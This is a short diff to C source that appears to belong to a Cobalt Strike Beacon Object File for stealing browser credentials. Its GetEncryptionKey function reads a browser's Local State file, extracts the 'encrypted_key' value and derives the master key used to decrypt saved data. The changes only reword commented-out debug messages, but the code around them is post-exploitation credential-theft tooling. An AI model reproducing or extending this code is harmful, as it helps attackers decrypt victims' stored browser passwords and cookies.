@@ -372,7 +372,6 @@ VOID GetEncryptionKey(char * browser) {
     }
 
     // commented out for now, as it is not needed with the use of app bound encryption
-    // get chrome key
     // CHAR *data = GetFileContent(localStatePath);
     // CHAR *key = NULL;
 
@@ -380,7 +379,7 @@ VOID GetEncryptionKey(char * browser) {
     //     BeaconPrintf(CALLBACK_ERROR,"Reading the file failed.\n");
     //     return;
     // }
-    // //BeaconPrintf(CALLBACK_OUTPUT, "Got Chrome Local State File");
+    // //BeaconPrintf(CALLBACK_OUTPUT, "Got Local State File");
     // // extract CHAR pattern[] = "\"encrypted_key\":\""; from file
     // CHAR pattern[] = "\"encrypted_key\":\"";
     // key = ExtractKey(data, pattern);
@@ -389,7 +388,7 @@ VOID GetEncryptionKey(char * browser) {
     //     BeaconPrintf(CALLBACK_ERROR,"getting the key failed.\n");
     //     return;
     // }
-    // //BeaconPrintf(CALLBACK_OUTPUT, "Got Chrome Key ");
+    // //BeaconPrintf(CALLBACK_OUTPUT, "Got Encrypted Key ");
     // GetMasterKey(key);
 
     CHAR *app_key = NULL;
